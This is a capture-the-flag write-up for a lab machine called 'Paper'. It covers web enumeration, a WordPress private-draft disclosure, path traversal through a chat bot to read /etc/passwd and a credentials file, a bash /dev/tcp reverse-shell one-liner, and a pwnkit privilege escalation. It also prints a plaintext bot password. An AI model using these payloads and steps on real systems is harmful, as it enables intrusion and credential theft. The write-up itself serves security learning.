# Paper

First as usual, `nmap`.

```
# Nmap 7.92 scan initiated Sun Feb  6 14:05:33 2022 as: nmap -vvv -p 22,80,443 -sCV -oA init 10.129.149.123
Nmap scan report for 10.129.149.123
Host is up, received syn-ack (0.25s latency).
Scanned at 2022-02-06 14:05:41 +07 for 26s

PORT    STATE SERVICE  REASON  VERSION
22/tcp  open  ssh      syn-ack OpenSSH 8.0 (protocol 2.0)
| ssh-hostkey:
|   2048 10:05:ea:50:56:a6:00:cb:1c:9c:93:df:5f:83:e0:64 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDcZzzauRoUMdyj6UcbrSejflBMRBeAdjYb2Fkpkn55uduA3qShJ5SP33uotPwllc3wESbYzlB9bGJVjeGA2l+G99r24cqvAsqBl0bLStal3RiXtjI/ws1E3bHW1+U35bzlInU7AVC9HUW6IbAq+VNlbXLrzBCbIO+l3281i3Q4Y2pzpHm5OlM2mZQ8EGMrWxD4dPFFK0D4jCAKUMMcoro3Z/U7Wpdy+xmDfui3iu9UqAxlu4XcdYJr7Iijfkl62jTNFiltbym1AxcIpgyS2QX1xjFlXId7UrJOJo3c7a0F+B3XaBK5iQjpUfPmh7RLlt6CZklzBZ8wsmHakWpysfXN
|   256 58:8c:82:1c:c6:63:2a:83:87:5c:2f:2b:4f:4d:c3:79 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBE/Xwcq0Gc4YEeRtN3QLduvk/5lezmamLm9PNgrhWDyNfPwAXpHiu7H9urKOhtw9SghxtMM2vMIQAUh/RFYgrxg=
|   256 31:78:af:d1:3b:c4:2e:9d:60:4e:eb:5d:03:ec:a0:22 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIKdmmhk1vKOrAmcXMPh0XRA5zbzUHt1JBbbWwQpI4pEX
80/tcp  open  http     syn-ack Apache httpd 2.4.37 ((centos) OpenSSL/1.1.1k mod_fcgid/2.3.9)
| http-methods:
|   Supported Methods: GET POST OPTIONS HEAD TRACE
|_  Potentially risky methods: TRACE
|_http-title: HTTP Server Test Page powered by CentOS
|_http-generator: HTML Tidy for HTML5 for Linux version 5.7.28
|_http-server-header: Apache/2.4.37 (centos) OpenSSL/1.1.1k mod_fcgid/2.3.9
443/tcp open  ssl/http syn-ack Apache httpd 2.4.37 ((centos) OpenSSL/1.1.1k mod_fcgid/2.3.9)
|_http-generator: HTML Tidy for HTML5 for Linux version 5.7.28
|_http-title: HTTP Server Test Page powered by CentOS
| http-methods:
|   Supported Methods: GET POST OPTIONS HEAD TRACE
|_  Potentially risky methods: TRACE
| tls-alpn:
|_  http/1.1
| ssl-cert: Subject: commonName=localhost.localdomain/organizationName=Unspecified/countryName=US/emailAddress=root@localhost.localdomain
| Subject Alternative Name: DNS:localhost.localdomain
| Issuer: commonName=localhost.localdomain/organizationName=Unspecified/countryName=US/organizationalUnitName=ca-3899279223185377061/emailAddress=root@localhost.localdomain
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2021-07-03T08:52:34
| Not valid after:  2022-07-08T10:32:34
| MD5:   579a 92bd 803c ac47 d49c 5add e44e 4f84
| SHA-1: 61a2 301f 9e5c 2603 a643 00b5 e5da 5fd5 c175 f3a9
| -----BEGIN CERTIFICATE-----
| MIIE4DCCAsigAwIBAgIIdryw6eirdUUwDQYJKoZIhvcNAQELBQAwgY8xCzAJBgNV
| BAYTAlVTMRQwEgYDVQQKDAtVbnNwZWNpZmllZDEfMB0GA1UECwwWY2EtMzg5OTI3
| OTIyMzE4NTM3NzA2MTEeMBwGA1UEAwwVbG9jYWxob3N0LmxvY2FsZG9tYWluMSkw
| JwYJKoZIhvcNAQkBFhpyb290QGxvY2FsaG9zdC5sb2NhbGRvbWFpbjAeFw0yMTA3
| MDMwODUyMzRaFw0yMjA3MDgxMDMyMzRaMG4xCzAJBgNVBAYTAlVTMRQwEgYDVQQK
| DAtVbnNwZWNpZmllZDEeMBwGA1UEAwwVbG9jYWxob3N0LmxvY2FsZG9tYWluMSkw
| JwYJKoZIhvcNAQkBFhpyb290QGxvY2FsaG9zdC5sb2NhbGRvbWFpbjCCASIwDQYJ
| KoZIhvcNAQEBBQADggEPADCCAQoCggEBAL1/3n1pZvFgeX1ja/w84jNxT2NcBkux
| s5DYnYKeClqncxe7m4mz+my4uP6J1kBP5MudLe6UE62KFX3pGc6HCp2G0CdA1gQm
| 4WYgF2E7aLNHZPrKQ+r1fqBBw6o3NkNxS4maXD7AvrCqkgpID/qSziMJdUzs9mS+
| NTzWq0IuSsTztLpxUEFv7T6XPGkS5/pE2hPWO0vz/Bd5BYL+3P08fPsC0/5YvgkV
| uvFbFrxmuOFOTEkrTy88b2fLkbt8/Zeh4LSdmQqriSpxDnag1i3N++1aDkIhAhbA
| LPK+rZq9PmUUFVY9MqizBEixxRvWhaU9gXMIy9ZnPJPpjDqyvju5e+kCAwEAAaNg
| MF4wDgYDVR0PAQH/BAQDAgWgMAkGA1UdEwQCMAAwIAYDVR0RBBkwF4IVbG9jYWxo
| b3N0LmxvY2FsZG9tYWluMB8GA1UdIwQYMBaAFBB8mEcpW4ZNBIaoM7mCF/Z+7ffA
| MA0GCSqGSIb3DQEBCwUAA4ICAQCw4uQfUe+FtsPdT0eXiLHg/5kXBGn8kfJZ45hP
| gcuwa5JfAQeA3JXx7piTSiMMk0GrWbqbrpX9ZIkwPnZrN+9PV9/SNCEJVTMy+LDQ
| QGsyqwkZpMK8QThzxRvXvnyf3XeEFDL6N4YeEzWz47VNlddeqOBHmrDI5SL+Eibh
| wxNj9UXwhEySUpgMAhU+QtXk40sjgv4Cs3kHvERvpwAfgRA7N38WY+njo/2VlGaT
| qP+UekP42JveOIWhf9p88MUmx2QqtOq/WF7vkBVbAsVs+GGp2SNhCubCCWZeP6qc
| HCX0/ipKZqY6zIvCcfr0wHBQDY9QwlbJcthg9Qox4EH1Sgj/qKPva6cehp/NzsbS
| JL9Ygb1h65Xpy/ZwhQTl+y2s+JxAoMy3k50n+9lzCFBiNzPLsV6vrTXCh7t9Cx07
| 9jYqMiQ35cEbQGIaKQqzguPXF5nMvWDBow3Oj7fYFlCdLTpaTjh8FJ37/PrhUWIl
| Li+WW8txrQKqm0/u1A41TI7fBxlUDhk6YFA+gIxX27ntQ0g+lLs8rwGlt/o+e3Xa
| OfcJ7Tl0ovWa+c9lWNju5mgdU+0v4P9bqv4XcIuyE0exv5MleA99uOYE1jlWuKf1
| m9v4myEY3dzgw3IBDmlYpGuDWQmMYx8RVytYN3Z3Z64WglMRjwEWNGy7NfKm7oJ4
| mh/ptg==
|_-----END CERTIFICATE-----
|_ssl-date: TLS randomness does not represent time
|_http-server-header: Apache/2.4.37 (centos) OpenSSL/1.1.1k mod_fcgid/2.3.9

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sun Feb  6 14:06:07 2022 -- 1 IP address (1 host up) scanned in 34.37 seconds
```

The websites on ports 80 and 443 seem to be the same with the only difference being the SSL certificate which doesn't reveal a domain name either with `localhost.localdomain` set. The pages' source code don't reveal anything special either. In trying to check for file extensions, I found that `index.php` returns a different page from `index.html` and other obviously non-existent pages so I ran `gobuster` with the `.php` extension. I only ran it on the `https` site since I later found a WordPress site on port 80.

```sh
$ gobuster dir -u https://10.129.149.123/ -k -w ~/tools/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php -r

/manual               (Status: 200) [Size: 9164]
```

Nothing useful. Checking the headers, I also found the domain name `office.paper` which I added to my `/etc/hosts`.

```sh
$ curl -Is http://10.129.149.123/index.php
HTTP/1.1 404 Not Found
Date: Sun, 06 Feb 2022 07:35:39 GMT
Server: Apache/2.4.37 (centos) OpenSSL/1.1.1k mod_fcgid/2.3.9
X-Powered-By: PHP/7.2.24
X-Backend-Server: office.paper
Content-Type: text/html; charset=UTF-8
```

This time, visiting `http://office.paper/` returns a new page while `https://office.paper/` returns the same page as when using the IP address. A quick look at `http://office.paper/` shows that it's a WordPress site so we run `wpscan` on it.

```sh
$ wpscan --url 'http://office.paper/' -e ap,at,tt,cb,dbe,u1-10,m1-10 --plugins-detection mixed
```

As a result, 3 usernames were found: prisonmike, nick, and creedthoughts. Also, the Wordpress version is `5.2.3` and the plugin `stops-core-theme-and-plugin-updates` version `9.0.9` is found.

Browsing the site, the post "Feeling Alone!" has an interesting comment by nick:

> Michael, you should remove the secret content from your drafts ASAP, as they are not that secure as you think!

Looks like there's a draft to be found containing some secret content.

The post "Hello Scranton!" has a comment by creedthoughts referencing the page `http://www.creedthoughts.gov.www\creedthoughts`. A quick search shows the page `https://creedthoughtsgov.com/` which contains the same URL on its frontpage, though it just seems to be a gimmick and not an OSINT thing.

After some looking around, I decided to fuzz for subdomains.

```sh
$ ffuf -u http://office.paper/ -H "Host: FUZZ.office.paper" -w ~/tools/SecLists/Discovery/DNS/subdomains-top1million-110000.txt -fc 403
chat                    [Status: 200, Size: 223163, Words: 13014, Lines: 508, Duration: 355ms]
```

I then added `chat.office.paper` to `/etc/hosts` and investigate the chat site. Without credentials though, not much can be found.

Going back to the `wpscan` results, I tried looking for exploits for WordPress 5.2.3 and found an interesting entry.

```sh
$ searchsploit wordpress 5.2.3
------------------------------------------------------------------------- ------------------------------
 Exploit Title                                                           |  Path
------------------------------------------------------------------------- ------------------------------
WordPress Core < 5.2.3 - Viewing Unauthenticated/Password/Private Posts  | multiple/webapps/47690.md
... <snip> ...
```

Simply by going to `http://office.paper/?static=1` as suggested, we can find several private posts, among which is the following.

```
Inside the FBI, Agent Michael Scarn sits with his feet up on his desk. His robotic butler Dwigt….

# Secret Registration URL of new Employee chat system

http://chat.office.paper/register/8qozr226AhkCHZdyY

# I am keeping this draft unpublished, as unpublished drafts cannot be accessed by outsiders. I am not that ignorant, Nick.

# Also, stop looking at my drafts. Jeez!
```

With the URL, we can register as a user. After registering and logging in, we can check out the "general" chat, inside which we have the bot `recyclops` whom we can directly message and use some bot commands on. It's stated that file access is limited to the Sales folder but we can easily traverse out using `../` like with `file ../../../etc/passwd` (`recyclops` can be omitted in direct messages).

Looking around, `../hubot/.env` contains credentials.

```sh
export ROCKETCHAT_URL='http://127.0.0.1:48320'
export ROCKETCHAT_USER=recyclops
export ROCKETCHAT_PASSWORD=Queenofblad3s!23
export ROCKETCHAT_USESSL=false
export RESPOND_TO_DM=true
export RESPOND_TO_EDITED=true
export PORT=8000
export BIND_ADDRESS=127.0.0.1
```

I tried logging into `chat.office.paper` as `recyclops` but immediately got logged out because it's a bot. Looking up "hubot", we can find its [source code](https://github.com/hubotio/hubot) and [the wiki for scripting it](https://hubot.github.com/docs/scripting/), thus finding that the commands are in `../hubot/scripts/`. Among the scripts is `run.js` which allows us to execute system commands. We can easily get a reverse shell as dwight by setting up a listener and running `run bash -c 'exec bash -i &>/dev/tcp/LHOST/LPORT <&1'`. After uploading my SSH key and running `chmod 600 authorized_keys`, I got a nice SSH shell.

Trying `sudo -l`, I found that dwight's password is the previously found `Queenofblad3s!23` but unfortunately he isn't allowed to run `sudo`.
Checking listening ports ...

```sh
[dwight@paper ~]$ ss -lntp
State     Recv-Q    Send-Q        Local Address:Port          Peer Address:Port    Process
LISTEN    0         128               127.0.0.1:3306               0.0.0.0:*
LISTEN    0         32            192.168.122.1:53                 0.0.0.0:*
LISTEN    0         128                 0.0.0.0:22                 0.0.0.0:*
LISTEN    0         128               127.0.0.1:48320              0.0.0.0:*
LISTEN    0         128               127.0.0.1:8000               0.0.0.0:*        users:(("node",pid=2375,fd=18))
LISTEN    0         70                127.0.0.1:33060              0.0.0.0:*
LISTEN    0         128               127.0.0.1:27017              0.0.0.0:*
LISTEN    0         128                       *:80                       *:*
LISTEN    0         128                    [::]:22                    [::]:*
LISTEN    0         128                       *:443                      *:*
```

Port 3306 is MySQL, Port 48320 is just the `http://chat.office.paper/` site, port 8000 is some unknown HTTP server, port 33060 is some unknown service, and port 27017 is MongoDB.

Looking at dwight's home, there's the very conspicuous `pk.sh` which seems to be an exploit for pwnkit (CVE-2021-4034). I tried running [this exploit](https://github.com/arthepsy/CVE-2021-4034) but it didn't work. Running it again though, followed by `su - hacked` and `sudo su` got me root. I've also tried resetting and rerunning the exploit twice and the first run would either fail to create the user `hacked` or complain `sudo: you do not exist in the passwd database` when `sudo su` is run. While seemingly unstable, `pk.sh` got us an easy root.
